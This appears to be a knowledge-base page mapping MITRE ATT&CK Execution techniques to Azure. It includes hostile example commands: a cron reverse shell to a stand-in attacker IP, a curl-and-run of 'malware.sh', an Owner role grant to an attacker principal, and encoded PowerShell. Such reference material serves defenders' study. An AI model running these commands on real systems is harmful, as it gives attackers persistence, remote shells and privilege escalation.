# Execution: TA0002

## Overview

The **Execution** phase focuses on how attackers **run malicious code** within a compromised environment to further their objectives. In **Azure environments**, attackers leverage automation tools, remote services, scripting interpreters, and native APIs to execute commands, manipulate resources, escalate privileges, and maintain control.

### **1. Running Commands via Azure Resource Manager**

**Technique: T1651 - Cloud Administration Commands**\
Attackers use AADInternals can execute commands on Azure virtual machines using the VM agent.

### **2. Running Code through Shells and Scripts**

**Technique: T1059 - Command and Scripting Interpreter**\
Attackers use PowerShell, Unix shells, and other scripting interpreters to run commands.

*   **T1059.001 - PowerShell:**\
    Use **Azure Automation Runbooks** to execute PowerShell commands and escalate privileges by assigning "Owner" role.

    ```powershell
    Add-AzRoleAssignment -RoleDefinitionName "Owner" -PrincipalId <AttackerID>
    ```
*   **T1059.004 - Unix Shell:**\
    Run a reverse shell via Bash on a compromised **Linux VM**.

    ```bash
    curl -o malware.sh https://<storage>.blob.core.windows.net/malware.sh && bash malware.sh
    ```

### **3. Automation and Scheduled Execution**

**Technique: T1053 - Scheduled Task/Job**\
Attackers use automated tasks to run malicious code periodically.

*   **T1053.003 - Cron Jobs:**\
    Add a cron job on a **Linux VM** to maintain persistent access.

    ```bash
    echo "* * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /etc/crontab
    ```
* **T1053.005 - Scheduled Task:**\
  Use **Windows Task Scheduler** on a VM to execute malware during every boot.

### **4. Remote Command Execution**

**Technique: T1569 - System Services**\
Attackers execute malicious scripts remotely on VMs or through Azure services.

*   **T1569.002 - Service Execution:**\
    Use **VM RunCommand** to run commands remotely on a compromised VM.

    ```bash
    az vm run-command invoke --command-id RunShellScript --name <VM_Name> --resource-group <Resource_Group> --scripts "id; whoami"
    ```

### **5. Trigger-Based Execution on Events**

**Technique: T1546 - Event Triggered Execution**\
Adversaries run code automatically when specific events occur.

* **T1546.004 - Unix Shell Configuration Modification:**\
  Modify `.bashrc` on a Linux VM to trigger a reverse shell on every user login.

### **6. Executing Code via Legitimate Tools (Living off the Land)**

**Technique: T1218 - Signed Binary Proxy Execution**\
Attackers use trusted binaries to avoid detection.

*   &#x20;Use **MSBuild.exe** (a legitimate tool) to execute malicious commands on a Windows VM.

    ```xml
    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
      <Target Name="MaliciousTask">
        <Exec Command="cmd.exe /c calc.exe" />
      </Target>
    </Project>
    ```

### **7. User-Initiated Execution through Social Engineering**

**Technique: T1204 - User Execution**\
Attackers rely on tricking users into running malicious code.

* **T1204.001 - Malicious Link:**\
  Send a phishing email with a **malicious Azure Blob URL** that downloads malware.
* **T1204.002 - Malicious File:**\
  Send an Excel file with **VBA macros** through Microsoft Teams, triggering a PowerShell payload.

### **8. Abusing APIs to Execute Code**

**Technique: T1106 - Native API**\
Attackers use APIs to automate and execute commands.

*   Use the **Azure REST API** to deploy unauthorized VMs.

    ```bash
    curl -X POST -H "Authorization: Bearer <token>" \
    "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<group-name>/providers/Microsoft.Compute/virtualMachines?api-version=2021-07-01"
    ```

### **9. Obfuscation Techniques for Stealth Execution**

**Technique: T1059.001 - PowerShell**\
Attackers hide commands by encoding or obfuscating them.

*   Run **Base64-encoded PowerShell** to avoid detection by security tools.

    ```powershell
    powershell.exe -EncodedCommand <Base64EncodedPayload>
    ```

### **Summary Techniques for TA0002**

| **Key Concept**                        | **Technique**                             | **Azure Example**                                 |
| -------------------------------------- | ----------------------------------------- | ------------------------------------------------- |
| Running Code with Shells and Scripts   | T1059 - Command and Scripting Interpreter | PowerShell via Runbooks to escalate privileges    |
| Automation and Scheduled Execution     | T1053 - Scheduled Task/Job                | Cron job on Linux VM for persistent reverse shell |
| Remote Command Execution               | T1569 - System Services                   | RunCommand to execute scripts on VMs              |
| Trigger-Based Execution on Events      | T1546 - Event Triggered Execution         | Modify `.bashrc` to run code on user login        |
| Living off the Land (Legitimate Tools) | T1218 - Signed Binary Proxy Execution     | Use MSBuild.exe to execute payloads               |
| User-Initiated Execution (Social Eng.) | T1204 - User Execution                    | Phishing link to Azure Blob hosting malware       |
| Executing Code via APIs                | T1106 - Native API                        | Use REST API to deploy unauthorized VMs           |
| Obfuscation and Stealth Techniques     | T1059.001 - PowerShell                    | Run encoded PowerShell commands                   |

